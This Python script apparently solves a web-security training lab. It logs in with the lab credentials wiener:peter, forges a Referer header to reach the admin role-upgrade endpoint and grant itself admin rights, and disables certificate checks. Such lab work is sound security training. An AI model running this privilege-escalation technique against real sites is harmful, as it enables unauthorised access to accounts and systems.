"""
    Lab: Referer-based access control

    Exploit steps:
    1. Login as wiener:peter 
    2. Upgrade wiener to be an admin using the Referer header to bypass the access control process

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False
   
    print(f"{Fore.YELLOW}Logging in as 'wiener'...{Fore.RESET}")
    data = { "username": "wiener", "password": "peter" }
    login(session, data)
    print(f"{Fore.GREEN}[+] Logged in!{Fore.RESET}")
    
    print(f"{Fore.YELLOW}Upgrading wiener's role...{Fore.RESET}")
    params = {"username": "wiener", "action": "upgrade"}
    upgrade_role(session, f"/admin-roles", params)
    
    response = fetch(session, '/admin')
    if response.status_code == 200:
        print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def login(session, data):
    try:
        session.post(f"{URL}/login", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
        exit(1)

def upgrade_role(session, path, params):
    try:
        headers = {
            "Referer": f"{URL}/admin"
        }
        session.get(
            f"{URL}{path}", 
            params=params, 
            headers=headers, 
            allow_redirects=False
        )
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to upgrade role through exception: {e}{Fore.RESET}")
        exit(1)

def fetch(session, path):
    try:
        return session.post(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()